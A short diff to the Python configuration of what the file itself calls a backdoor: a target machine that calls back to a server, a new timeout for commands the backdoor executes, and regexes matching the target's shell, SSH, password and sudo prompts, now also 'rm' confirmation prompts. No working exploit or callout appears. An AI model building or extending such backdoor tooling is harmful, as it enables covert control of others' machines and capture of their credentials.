@@ -10,6 +10,9 @@ PORT_NUMBER = 4321 # port used by server machine
 MIN_MESSAGE_LENGTH = 128 # smallest message size sent from my testing
 MAX_MESSAGE_LENGTH = 2**24 # Increase if too small (# TODO: some connection breaking errors probably related to this)
 
+# amount of time that the backdoor waits for a command to finish executing
+COMMAND_TIMEOUT = 30
+
 # list of allowed message lengths (please only input up to 10 sizes in ascending order)
 fixed_message_length_list = [MIN_MESSAGE_LENGTH, 256, 512, 1024, 2048, 4096, 8192, 2**15, 2**18, MAX_MESSAGE_LENGTH]
 
@@ -22,7 +25,7 @@ SLEEP_TIME = 10 # number of seconds target machine will wait between making call
 
 # !!!--- LEAVE BELOW ALONE ---!!!
 
-TARGET_SHELL_PROMPT_REGEX_LIST = ['\][\s\S]*\$', '\[.+@.+ [\s\S]+\][#]', 'The authenticity of host [\s\S]+Are you sure you want to continue connecting \(yes/no\)\?', '.+@.+ password:', '\[sudo\] password for .+:']
+TARGET_SHELL_PROMPT_REGEX_LIST = ['\][\s\S]*\$', '\[.+@.+ [\s\S]+\][#]', 'The authenticity of host [\s\S]+Are you sure you want to continue connecting \(yes/no\)\?', '.+@.+ password:', '\[sudo\] password for .+:', 'rm: remove [\s\S]+ file [\s\S]+\?']
 
 # [\u@\h \W]\$
 
